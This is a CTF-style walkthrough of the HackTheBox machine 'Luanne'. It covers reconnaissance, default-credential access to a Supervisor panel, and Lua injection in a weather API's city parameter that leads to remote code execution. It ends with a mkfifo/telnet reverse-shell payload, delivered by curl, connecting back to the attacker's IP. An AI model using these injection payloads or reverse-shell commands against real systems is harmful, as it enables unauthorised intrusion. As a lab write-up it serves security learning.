title: Luanne - Walkthrough
---

Luanne was definitly a different flavor. I had to dig deeper into NetBSD and discover new commands. The foothold requires to make a lot of test and the privilege escaltion needs a good enumeration of the box. Overall, a very nice box !

## Recon
I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.

{% highlight sh %}
sudo nmap luanne && sudo nmap -sCV -p- luanne -oN nmap
{% endhighlight %}

We have SSH and 2 web servers on port 80 and 9001. I'm gonna grab a few informations here and then visit these servers : 

- Port 80: Nginx 1.19
- 1 entry in `robots.txt` => `/weather`
- Port 9001: Medusa httpd 1.12 (Supervisor Process Manager)
- Service info: <strong>NetBSD</strong>


Now let's have a look at the web site on port 80 `http://luanne`.
The server requests credentials to connect so, I've tried to visit the port 9001 and we have the same thing. 

It seems like we have to make a bit of research on these services, but before starting googling everything, I like to have some enumeration script in the background so, I'm gonna run `gobuster` and `nikto` on port 80. Remember that we had an entry (/weather) in `robots.txt`, moreover, if I try to browse to the `http://luanne/weather` directory, I got a <cite><strong>404 - Not Found</strong></cite>, but the good news is that the server is not asking for credentials anymore. Hence, I'm gonna try to enumerate that folder. 

{% highlight sh %}
gobuster dir -u http://luanne/weather -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50
{% endhighlight %}
{% highlight sh %}
nikto -h http://luanne
{% endhighlight %}

While this is running, I'm gonna look for that service on port 9001. 

I've quickly found the [documentation](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/) of the <strong>Supervisor Process Manager</strong>. 

> Supervisor is a client/server system that allows its users to monitor and control a number of processes on UNIX-like
operating systems.
It shares some of the same goals of programs like launchd, daemontools, and runit. Unlike some of these programs,
it is not meant to be run as a substitute for init as “process id 1”. Instead it is meant to be used to control processes
related to a project or a customer, and is meant to start like any other program at boot time.


Basically, it's a monitoring system. More interestingly, in the documentation I can see that they use the same credentials multiple times as an example, so, let's try to connect with the user user and the password 123. It worked!
As mentioned, it's a monitoring tool so we have access to a panel where we can do a few operations like, Start/Stop a service or check the logs etc...

From the three processes that we have access to, one allow me to have a sneak peak at the box.

Here I've taken a bit of time to make researches on that command. Apparently, <strong>NetBSD</strong> uses `bozohttpd` to run a web server. Here is the [doc](http://www.eterna.com.au/bozohttpd/bozohttpd.8.html) if you want to have a look at it.


| Argument | Description 	|
| -----: 	| ----- 		|
| -u | Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html (but see the -p option above). |
| -X | Enables directory indexing. A directory index will be generated only when the default file (i.e. index.html normally) is not present. |
| -s | Forces logging to be set to stderr always. |
| -i | Causes address to be used as the address to bind daemon mode. If otherwise unspecified, the address used to bind is derived from the myname, which defaults to the name returned by gethostname(3). Only the last -i option is used. This option is only valid with the -b option. |
| -I | Causes bozohttpd to use port instead of the default http port. When used with the -b option, it changes the bound port. Otherwise it forces redirections to use this port instead of the value obtained via getsockname(2). |
| -L | Adds a new Lua script for a particular prefix. The prefix should be an arbitrary text, and the script should be a full path to a Lua script. Multiple -L options may be passed. A separate Lua state is created for each prefix. The Lua script can register callbacks using the httpd.register_handler(\'\<name\>\', function) Lua function, which will trigger the execution of the Lua function function when a URL in the form http://\<hostname\>// is being accessed. The function is passed three tables as arguments, the server environment, the request headers, and the decoded query string plus any data that was sent as application/x-www-form-urlencoded. |
| -U | Causes bozohttpd to switch to the user and the groups of username after initialization. This option, like -t above, causes bozohttpd to clear the environment unless the -e option is given. |
| -b | Enables daemon mode, where bozohttpd detaches from the current terminal, running in the background and servicing HTTP requests. |

There is local web server running on port 3000. Interestingly enough, a Lua script is linked to the weather prefix, which reminds me about that weather directory on port 80. Could it be the same directory share by 2 different servers, Nginx and bozohttpd?
GoBuster reported only one entry /forecast for the weather folder.

Let's have a look at `http://luanne/weather/forecast`.

It's a `JSON` document saying that we need to use a parameter named `city` to get more data. 
By doing, `city=list`, I get all the cities available and then I can have the forecast for a specific city by doing `city=London` for example.

I know from the port 9001 that a `lua` script is behind, so my guess is that we might try to play with that `city` parameter and see if this is vulnerable or not. 

To do that, I like to use ZAP Proxy. My goal here is to force an error message from the website.
One of the first test I like to do is check if the input properly sanitize by the script. Hence, I put an ' at the of the name of the city. Like this:

>GET http://luanne/weather/forecast?city=London' HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: luanne


And we got an error !

>HTTP/1.1 500 Error
Server: nginx/1.19.0
Date: Mon, 07 Dec 2020 10:50:14 GMT
Content-Type: application/json
Connection: keep-alive

><br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

I guess the script concatenate the value that we put in the parameter and by putting a ', we just break the concatenation. I'm not very familiar with Lua, but the concatenation syntax is not very complicated. Just be sure of it, let's try concatenates a value inside the parameter.

> GET http://luanne/weather/forecast?city=Lon'%20..%20'don HTTP/1.1

We still have an error but the concatenation is successful ! 


>HTTP/1.1 500 Error
Server: nginx/1.19.0
Date: Mon, 07 Dec 2020 10:59:01 GMT
Content-Type: application/json
Connection: keep-alive

>{"code": 500,"error": "unknown city: London"}

Now we know that we can break outside the concatenation system and maybe execute commands on the system. The function that we want to use in Lua script is os.execute(). So, if I send this:

> GET http://luanne/weather/forecast?city=Lon'%20..%20os.execute(%22whoami%22)' HTTP/1.1

I get that response from the server:

> HTTP/1.1 500 Error
Server: nginx/1.19.0
Date: Mon, 07 Dec 2020 11:17:43 GMT
Content-Type: application/json
Connection: keep-alive

>{"code": 500,_httpd
\<br\>Lua error: [string "                httpd.write('{"code": 500,')..."]:2: attempt to call a boolean value

Which means that we have code execution. Great!
All we need to do now is to find a way to get a shell from that `RCE`.

## Foothold
First, I set up a listener on my machine.

{% highlight sh %}
nc -lvnp 2222
{% endhighlight %}

Then I've tried to invoke `netcat` and other tools on the box, but it seems like <strong>NetBSD</strong> doesn't like it. I found that interesting [blog](https://sentrywhale.covm/documentation/reverse-shell) where it gives a few commands to try on 
<strong>NetBSD</strong>.

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 172.18.0.2 8080 > /tmp/f

Let's try to send that to the remote server with `curl`. 


> curl "http://luanne/weather/forecast?city=Lond%27%20..%20os.execute(%22rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Ctelnet%2010.10.14.11%202222%20%3E%20/tmp/f%22)%20..%20%27on"


After a few seconds, I got connection on the box !
